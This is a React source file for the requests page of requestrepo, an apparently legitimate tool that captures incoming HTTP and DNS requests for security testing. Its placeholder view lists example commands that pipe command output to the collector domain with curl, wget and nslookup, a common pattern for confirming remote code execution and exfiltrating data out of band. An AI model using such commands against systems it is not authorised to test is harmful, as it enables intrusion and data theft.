import { useEffect, useState } from "react";
import { Card, CardBody, Code, Button } from "@heroui/react";
import { Copy, Check, Share2 } from "lucide-react";
import { toast } from "sonner";
import Editor from "@monaco-editor/react";
import { useSessionStore } from "@/stores/sessionStore";
import { useRequestStore } from "@/stores/requestStore";
import { useUiStore } from "@/stores/uiStore";
import { apiClient } from "@/api/client";
import { useTheme } from "@/hooks/useTheme";
import { isHttpRequest, isDnsRequest } from "@/types";
import { formatDate, copyToClipboard, getFlagClass } from "@/lib/utils";
import { decodeBase64Safe } from "@/lib/base64";
import { getBaseDomain, getDnsDomain } from "@/lib/config";

const PYTHON_EXAMPLE = `from requestrepo import Requestrepo  # pip install requestrepo

client = Requestrepo(token="TOKEN_HERE", host="requestrepo.com")

print(client.subdomain)  # SUBDOMAIN_HERE
print(client.domain)  # SUBDOMAIN_HERE.requestrepo.com

# Wait for a new HTTP request
request = client.get_request()
print(request.method, request.path, request.headers)

# Set a custom HTTP response
client.set_http_response(
    status_code=200,
    headers={"Content-Type": "text/html"},
    body="<h1>Hello from RequestRepo!</h1>"
)

# Add DNS records
client.add_dns_record("A", "1.2.3.4")
client.add_dns_record("TXT", "verification=abc123")`;

export function RequestsPage() {
  const { resolvedTheme } = useTheme();
  const sessions = useSessionStore((s) => s.sessions);
  const activeSubdomain = useSessionStore((s) => s.activeSubdomain);
  const session = sessions.find((s) => s.subdomain === activeSubdomain);

  const allRequests = useRequestStore((s) => s.requests);
  const requests = activeSubdomain ? (allRequests[activeSubdomain] ?? []) : [];

  const selectedRequestId = useUiStore((s) => s.selectedRequestId);
  const markRequestVisited = useUiStore((s) => s.markRequestVisited);
  const sharedRequest = useUiStore((s) => s.sharedRequest);

  const [copied, setCopied] = useState(false);

  // Use shared request if available, otherwise find from session requests
  const selectedRequest =
    sharedRequest || requests.find((r) => r._id === selectedRequestId);
  const isSharedRequestView = Boolean(sharedRequest);
  const httpDomain = getBaseDomain();
  const dnsDomain = getDnsDomain();
  const subdomain = session?.subdomain || "xxxxxxxx";
  const fullHttpDomain = `${subdomain}.${httpDomain}`;
  const fullDnsDomain = `${subdomain}.${dnsDomain}`;

  // Mark as visited when selected (only for non-shared requests)
  useEffect(() => {
    if (selectedRequest && activeSubdomain && !isSharedRequestView) {
      markRequestVisited(activeSubdomain, selectedRequest._id);
    }
  }, [
    selectedRequest,
    activeSubdomain,
    markRequestVisited,
    isSharedRequestView,
  ]);

  const handleCopyCode = () => {
    const code = PYTHON_EXAMPLE.replace(
      /TOKEN_HERE/g,
      session?.token || "your_token",
    ).replace(/SUBDOMAIN_HERE/g, subdomain);
    copyToClipboard(code);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  const handleShareRequest = async () => {
    if (!selectedRequest || !session?.token) return;

    try {
      const shareToken = await apiClient.createShareToken(
        session.token,
        selectedRequest._id,
      );
      const url = `${window.location.origin}/?request=${shareToken}`;
      copyToClipboard(url);
      toast.success("Request share link copied to clipboard");
    } catch (error) {
      console.error("Failed to create share link:", error);
      toast.error("Failed to create share link");
    }
  };

  // Show "Awaiting requests" when no request selected
  if (!selectedRequest) {
    return (
      <div className="flex h-full flex-col">
        <div className="mb-6">
          <h2 className="mb-4 text-xl font-semibold">Awaiting requests</h2>
          <p className="mb-4 text-default-500">How to make a request:</p>

          <div className="space-y-2 font-mono text-sm">
            <Code className="block p-2">curl http://{fullHttpDomain}</Code>
            <Code className="block p-2">
              curl http://{httpDomain}/r/{subdomain}/
            </Code>
            <Code className="block p-2">
              curl -X POST --data hello http://{fullHttpDomain}
            </Code>
            <Code className="block p-2">
              nslookup your.data.here.{fullDnsDomain}
            </Code>
            <Code className="block p-2">
              echo RCE | curl -d @- {fullHttpDomain}
            </Code>
            <Code className="block p-2">
              wget --post-data "$(echo RCE)" -O- {fullHttpDomain}
            </Code>
          </div>

          <p className="mt-6 text-default-500">
            Check out the <span className="text-primary">Response</span> tab to
            edit your HTTP Response or the{" "}
            <span className="text-primary">DNS</span> tab to add DNS records for
            this subdomain.
          </p>
        </div>

        <div className="flex-1">
          <p className="mb-3 text-default-500">
            Automate requests/responses using the requestrepo Python library:
          </p>

          <Card className="relative">
            <CardBody className="p-0">
              <Button
                isIconOnly
                size="sm"
                variant="flat"
                className="absolute right-2 top-2 z-10"
                onPress={handleCopyCode}
              >
                {copied ? (
                  <Check className="h-4 w-4 text-success" />
                ) : (
                  <Copy className="h-4 w-4" />
                )}
              </Button>
              <Editor
                height="280px"
                language="python"
                theme={resolvedTheme === "dark" ? "vs-dark" : "light"}
                value={PYTHON_EXAMPLE.replace(
                  /TOKEN_HERE/g,
                  session?.token ? "********" : "your_token",
                ).replace(/SUBDOMAIN_HERE/g, subdomain)}
                options={{
                  readOnly: true,
                  minimap: { enabled: false },
                  fontSize: 13,
                  lineNumbers: "on",
                  lineNumbersMinChars: 4,
                  scrollBeyondLastLine: false,
                  automaticLayout: true,
                  padding: { top: 12, bottom: 12 },
                  folding: false,
                  lineDecorationsWidth: 16,
                }}
              />
            </CardBody>
          </Card>
        </div>
      </div>
    );
  }

  if (isHttpRequest(selectedRequest)) {
    const { text: bodyText, isPrintable } = decodeBase64Safe(
      selectedRequest.raw,
    );
    const queryParams = selectedRequest.query
      ? new URLSearchParams(selectedRequest.query.replace(/^\?/, ""))
      : null;

    // Build raw request
    const rawRequest = [
      `${selectedRequest.method} ${selectedRequest.path}${selectedRequest.query ?? ""} ${selectedRequest.protocol}`,
      ...Object.entries(selectedRequest.headers).map(([k, v]) => `${k}: ${v}`),
      "",
      isPrintable ? bodyText : "[Binary data]",
    ].join("\n");

    return (
      <Card className="h-full overflow-auto">
        <CardBody className="p-4 relative">
          {/* Share button - only show if user has the session */}
          {!isSharedRequestView && (
            <Button
              isIconOnly
              size="sm"
              variant="light"
              onPress={handleShareRequest}
              className="absolute right-4 top-4"
              title="Share request"
            >
              <Share2 className="h-4 w-4" />
            </Button>
          )}

          {/* Shared request banner */}
          {isSharedRequestView && (
            <div className="mb-4 p-2 bg-primary/10 rounded-lg text-sm text-primary">
              You are viewing a shared request
            </div>
          )}

          {/* Request Details */}
          <h3 className="text-base font-semibold mb-2">Request Details</h3>
          <table className="w-full text-xs mb-4">
            <tbody>
              <tr className="border-b border-default-100">
                <td className="py-1 pr-4 text-default-500 w-32">
                  Request Type
                </td>
                <td className="py-1">
                  <span className="inline-block px-1 py-px text-[8px] font-semibold text-white bg-blue-500 rounded mr-1">
                    HTTP/1.1
                  </span>
                  <span
                    className={`inline-block px-1 py-px text-[8px] font-semibold text-white rounded ${
                      selectedRequest.method === "GET"
                        ? "bg-[#20d077]"
                        : selectedRequest.method === "POST"
                          ? "bg-[#ffae00]"
                          : selectedRequest.method === "PUT"
                            ? "bg-[#ff9800]"
                            : selectedRequest.method === "DELETE"
                              ? "bg-[#f44336]"
                              : "bg-[#9e9e9e]"
                    }`}
                  >
                    {selectedRequest.method}
                  </span>
                </td>
              </tr>
              <tr className="border-b border-default-100">
                <td className="py-1 pr-4 text-default-500">URL</td>
                <td className="py-1 font-mono text-primary">
                  {selectedRequest.url}
                </td>
              </tr>
              <tr className="border-b border-default-100">
                <td className="py-1 pr-4 text-default-500">Sender</td>
                <td className="py-1 font-mono">
                  {selectedRequest.ip}
                  {selectedRequest.port ? `:${selectedRequest.port}` : ""}
                </td>
              </tr>
              {selectedRequest.country && (
                <tr className="border-b border-default-100">
                  <td className="py-1 pr-4 text-default-500">Country</td>
                  <td className="py-1">
                    <span
                      className={`${getFlagClass(selectedRequest.country)} mr-1`}
                    />
                    {selectedRequest.country} (
                    <a
                      href="https://db-ip.com"
                      className="text-primary hover:underline"
                      target="_blank"
                      rel="noopener noreferrer"
                    >
                      IP Geolocation by DB-IP
                    </a>
                    )
                  </td>
                </tr>
              )}
              <tr className="border-b border-default-100">
                <td className="py-1 pr-4 text-default-500">Date</td>
                <td className="py-1">{formatDate(selectedRequest.date)}</td>
              </tr>
              <tr className="border-b border-default-100">
                <td className="py-1 pr-4 text-default-500">Path</td>
                <td className="py-1 font-mono">{selectedRequest.path}</td>
              </tr>
              <tr className="border-b border-default-100">
                <td className="py-1 pr-4 text-default-500">Query string</td>
                <td className="py-1 font-mono">
                  {selectedRequest.query || ""}
                </td>
              </tr>
              <tr>
                <td className="py-1 pr-4 text-default-500">Fragment</td>
                <td className="py-1 font-mono"></td>
              </tr>
            </tbody>
          </table>

          {/* Headers */}
          <h3 className="text-base font-semibold mb-2">Headers</h3>
          <table className="w-full text-xs mb-4">
            <tbody>
              {Object.entries(selectedRequest.headers).map(([key, value]) => (
                <tr key={key} className="border-b border-default-100">
                  <td className="py-0.5 pr-4 text-default-500 w-44 font-mono">
                    {key}
                  </td>
                  <td className="py-0.5 font-mono break-all">{value}</td>
                </tr>
              ))}
            </tbody>
          </table>

          {/* Query Parameters */}
          <h3 className="text-base font-semibold mb-2">Query Parameters</h3>
          {queryParams && Array.from(queryParams.entries()).length > 0 ? (
            <table className="w-full text-xs mb-4">
              <tbody>
                {Array.from(queryParams.entries()).map(([key, value]) => (
                  <tr key={key} className="border-b border-default-100">
                    <td className="py-0.5 pr-4 text-default-500 w-44 font-mono">
                      {key}
                    </td>
                    <td className="py-0.5 font-mono">{value}</td>
                  </tr>
                ))}
              </tbody>
            </table>
          ) : (
            <p className="text-default-400 text-xs mb-4">(empty)</p>
          )}

          {/* Form Data / Body */}
          <h3 className="text-base font-semibold mb-2">Form Data</h3>
          {selectedRequest.raw ? (
            <Code className="block whitespace-pre-wrap p-2 text-xs mb-4">
              {isPrintable
                ? bodyText
                : `[Binary data, ${selectedRequest.raw.length} bytes]`}
            </Code>
          ) : (
            <p className="text-default-400 text-xs mb-4">(empty)</p>
          )}

          {/* Raw request */}
          <h3 className="text-base font-semibold mb-2">Raw request</h3>
          <Code className="block p-3 text-xs mb-2 overflow-x-auto break-all whitespace-pre-wrap min-h-[60px]">
            {btoa(rawRequest)}
          </Code>
          <Code className="block whitespace-pre-wrap p-2 text-xs font-mono">
            {rawRequest}
          </Code>
        </CardBody>
      </Card>
    );
  }

  if (isDnsRequest(selectedRequest)) {
    const rawDecoded = decodeBase64Safe(selectedRequest.raw);

    return (
      <Card className="h-full overflow-auto">
        <CardBody className="p-4 relative">
          {/* Share button - only show if user has the session */}
          {!isSharedRequestView && (
            <Button
              isIconOnly
              size="sm"
              variant="light"
              onPress={handleShareRequest}
              className="absolute right-4 top-4"
              title="Share request"
            >
              <Share2 className="h-4 w-4" />
            </Button>
          )}

          {/* Shared request banner */}
          {isSharedRequestView && (
            <div className="mb-4 p-2 bg-primary/10 rounded-lg text-sm text-primary">
              You are viewing a shared request
            </div>
          )}

          {/* Request Details */}
          <h3 className="text-base font-semibold mb-2">Request Details</h3>
          <table className="w-full text-xs mb-4">
            <tbody>
              <tr className="border-b border-default-100">
                <td className="py-1 pr-4 text-default-500 w-32">
                  Request Type
                </td>
                <td className="py-1">
                  <span className="inline-block px-1 py-px text-[8px] font-semibold text-white bg-[#33daff] rounded">
                    DNS
                  </span>
                </td>
              </tr>
              <tr className="border-b border-default-100">
                <td className="py-1 pr-4 text-default-500">Hostname</td>
                <td className="py-1 font-mono">{selectedRequest.domain}</td>
              </tr>
              <tr className="border-b border-default-100">
                <td className="py-1 pr-4 text-default-500">Sender</td>
                <td className="py-1 font-mono">
                  {selectedRequest.ip}
                  {selectedRequest.port ? `:${selectedRequest.port}` : ""}
                </td>
              </tr>
              {selectedRequest.country && (
                <tr className="border-b border-default-100">
                  <td className="py-1 pr-4 text-default-500">Country</td>
                  <td className="py-1">
                    <span
                      className={`${getFlagClass(selectedRequest.country)} mr-1`}
                    />
                    {selectedRequest.country} (
                    <a
                      href="https://db-ip.com"
                      className="text-primary hover:underline"
                      target="_blank"
                      rel="noopener noreferrer"
                    >
                      IP Geolocation by DB-IP
                    </a>
                    )
                  </td>
                </tr>
              )}
              <tr className="border-b border-default-100">
                <td className="py-1 pr-4 text-default-500">Date</td>
                <td className="py-1">{formatDate(selectedRequest.date)}</td>
              </tr>
              <tr>
                <td className="py-1 pr-4 text-default-500">Type</td>
                <td className="py-1">
                  <span
                    className={`inline-block px-1 py-px text-[8px] font-semibold text-white rounded ${
                      selectedRequest.query_type === "A"
                        ? "bg-[#006fee]"
                        : selectedRequest.query_type === "AAAA"
                          ? "bg-[#9353d3]"
                          : selectedRequest.query_type === "CNAME"
                            ? "bg-[#f5a524]"
                            : selectedRequest.query_type === "TXT"
                              ? "bg-[#17c964]"
                              : selectedRequest.query_type === "MX"
                                ? "bg-[#f31260]"
                                : "bg-[#71717a]"
                    }`}
                  >
                    {selectedRequest.query_type}
                  </span>
                </td>
              </tr>
            </tbody>
          </table>

          {/* Reply */}
          <h3 className="text-base font-semibold mb-2">Reply</h3>
          <Code className="block whitespace-pre-wrap p-2 text-xs font-mono mb-4 overflow-x-auto">
            {selectedRequest.reply || "No response"}
          </Code>

          {/* Raw request */}
          <h3 className="text-base font-semibold mb-2">Raw request</h3>
          <Code className="block p-3 text-xs mb-2 overflow-x-auto break-all">
            {selectedRequest.raw}
          </Code>
          <Code className="block whitespace-pre-wrap p-2 text-xs font-mono overflow-x-auto">
            {rawDecoded.text}
          </Code>
        </CardBody>
      </Card>
    );
  }

  return null;
}
